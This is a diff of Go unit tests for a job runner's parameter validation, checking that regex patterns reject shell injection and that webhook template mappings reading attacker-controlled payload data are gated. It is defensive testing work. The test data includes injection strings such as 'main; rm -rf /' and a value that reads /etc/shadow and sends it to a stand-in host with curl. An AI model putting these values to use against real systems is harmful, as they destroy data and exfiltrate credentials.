@@ -119,3 +119,128 @@ func TestResolveParams_DoesNotMutateSuppliedMap(t *testing.T) {
 	require.NoError(t, err)
 	assert.Empty(t, supplied, "resolveParams must not mutate the caller's map")
 }
+
+func TestResolveParams_EnforcesPattern(t *testing.T) {
+	inputs := []dsl.Input{{Name: "ref", Type: "string", Pattern: `^[A-Za-z0-9._/-]+$`}}
+
+	_, err := resolveParams(inputs, map[string]string{"ref": "main; rm -rf /"})
+	require.Error(t, err, "a value with shell metacharacters must be rejected")
+	assert.Contains(t, err.Error(), "ref")
+
+	got, err := resolveParams(inputs, map[string]string{"ref": "refs/heads/main"})
+	require.NoError(t, err)
+	assert.Equal(t, "refs/heads/main", got["ref"])
+}
+
+func TestResolveParams_InvalidPatternIsAnError(t *testing.T) {
+	inputs := []dsl.Input{{Name: "ref", Type: "string", Pattern: "([unclosed"}}
+	_, err := resolveParams(inputs, map[string]string{"ref": "x"})
+	require.Error(t, err, "a malformed pattern must fail loudly, not silently allow everything")
+}
+
+func TestResolveParams_NoPatternStillWorks(t *testing.T) {
+	inputs := []dsl.Input{{Name: "msg", Type: "string"}}
+	got, err := resolveParams(inputs, map[string]string{"msg": "anything goes"})
+	require.NoError(t, err)
+	assert.Equal(t, "anything goes", got["msg"])
+}
+
+func TestResolveParams_PatternAppliesToDefault(t *testing.T) {
+	// A bad default must not slip through unvalidated.
+	inputs := []dsl.Input{{Name: "env", Type: "string", Default: "staging;rm -rf /", Pattern: `^[A-Za-z0-9._/-]+$`}}
+	_, err := resolveParams(inputs, map[string]string{})
+	require.Error(t, err)
+	assert.Contains(t, err.Error(), "env")
+}
+
+func TestResolveParams_ErrorDoesNotEchoRejectedValue(t *testing.T) {
+	// The rejected value may itself carry an injection payload; it must not be
+	// echoed into an operator-read error message.
+	inputs := []dsl.Input{{Name: "ref", Type: "string", Pattern: `^[A-Za-z0-9._/-]+$`}}
+	secretPayload := "main; curl evil.example/$(cat /etc/shadow)"
+	_, err := resolveParams(inputs, map[string]string{"ref": secretPayload})
+	require.Error(t, err)
+	assert.NotContains(t, err.Error(), secretPayload)
+}
+
+func TestValidateWebhookPayloadMappedParams_RejectsUndeclaredInput(t *testing.T) {
+	mapping := map[string]string{"ref": `{{ index .Payload "ref" }}`}
+	err := validateWebhookPayloadMappedParams("wh", mapping, nil, "build")
+	require.Error(t, err)
+	assert.Contains(t, err.Error(), `"wh"`)
+	assert.Contains(t, err.Error(), `"ref"`)
+	assert.Contains(t, err.Error(), `"build"`)
+}
+
+func TestValidateWebhookPayloadMappedParams_RejectsInputWithoutPatternOrUnvalidated(t *testing.T) {
+	mapping := map[string]string{"ref": `{{ .Payload.ref }}`}
+	inputs := []dsl.Input{{Name: "ref", Type: "string"}}
+	err := validateWebhookPayloadMappedParams("wh", mapping, inputs, "build")
+	require.Error(t, err)
+}
+
+func TestValidateWebhookPayloadMappedParams_AllowsDeclaredPattern(t *testing.T) {
+	mapping := map[string]string{"ref": `{{ .Payload.ref }}`}
+	inputs := []dsl.Input{{Name: "ref", Type: "string", Pattern: `^[A-Za-z0-9._/-]+$`}}
+	require.NoError(t, validateWebhookPayloadMappedParams("wh", mapping, inputs, "build"))
+}
+
+func TestValidateWebhookPayloadMappedParams_AllowsExplicitUnvalidated(t *testing.T) {
+	mapping := map[string]string{"message": `{{ .Payload.message }}`}
+	inputs := []dsl.Input{{Name: "message", Type: "string", Unvalidated: true}}
+	require.NoError(t, validateWebhookPayloadMappedParams("wh", mapping, inputs, "build"))
+}
+
+func TestValidateWebhookPayloadMappedParams_RejectsHeadersWithoutPatternOrUnvalidated(t *testing.T) {
+	// .Headers is not yet implemented, but the guard must fail-safe in advance:
+	// if it is ever added, mappings using it require pattern: or unvalidated: true
+	// to be explicit about accepting attacker-controlled data.
+	mapping := map[string]string{"custom_header": `{{ .Headers.X-Custom-Ref }}`}
+	inputs := []dsl.Input{{Name: "custom_header", Type: "string"}}
+	err := validateWebhookPayloadMappedParams("wh", mapping, inputs, "build")
+	require.Error(t, err)
+	assert.Contains(t, err.Error(), `"wh"`)
+	assert.Contains(t, err.Error(), `"custom_header"`)
+	assert.Contains(t, err.Error(), `"build"`)
+}
+
+func TestValidateWebhookPayloadMappedParams_RejectsDotFormWithoutPatternOrUnvalidated(t *testing.T) {
+	// {{ . }} renders WebhookTemplateData's entire (attacker-controlled)
+	// Payload field without containing the substring ".Payload" anywhere in
+	// the template text — the fail-open bypass the reviewer found empirically
+	// (tpl="{{ . }}" rendered the full payload map). The positive "{{"
+	// check must catch this even though no enumerated substring matches.
+	mapping := map[string]string{"raw": `{{ . }}`}
+	inputs := []dsl.Input{{Name: "raw", Type: "string"}}
+	err := validateWebhookPayloadMappedParams("wh", mapping, inputs, "build")
+	require.Error(t, err)
+	assert.Contains(t, err.Error(), `"wh"`)
+	assert.Contains(t, err.Error(), `"raw"`)
+	assert.Contains(t, err.Error(), `"build"`)
+}
+
+func TestValidateWebhookPayloadMappedParams_RejectsDollarFormWithoutPatternOrUnvalidated(t *testing.T) {
+	// {{ $ }} is the same whole-payload bypass as {{ . }}, via the root
+	// template variable instead of dot.
+	mapping := map[string]string{"raw": `{{ $ }}`}
+	inputs := []dsl.Input{{Name: "raw", Type: "string"}}
+	err := validateWebhookPayloadMappedParams("wh", mapping, inputs, "build")
+	require.Error(t, err)
+}
+
+func TestValidateWebhookPayloadMappedParams_DotFormWithPatternPasses(t *testing.T) {
+	// A pattern: still lets a {{ . }}-style mapping through — the guard cares
+	// only about whether the resolved value is validated, not the specific
+	// template syntax used to produce it.
+	mapping := map[string]string{"raw": `{{ . }}`}
+	inputs := []dsl.Input{{Name: "raw", Type: "string", Pattern: `^[A-Za-z0-9._/-]+$`}}
+	require.NoError(t, validateWebhookPayloadMappedParams("wh", mapping, inputs, "build"))
+}
+
+func TestValidateWebhookPayloadMappedParams_IgnoresLiteralMapping(t *testing.T) {
+	// A mapping that never reads .Payload is author-controlled (set directly
+	// in the receiver's YAML), not attacker-controlled, so it is not subject
+	// to this check even if the job declares no pattern for it.
+	mapping := map[string]string{"image": "myapp"}
+	require.NoError(t, validateWebhookPayloadMappedParams("wh", mapping, nil, "build"))
+}
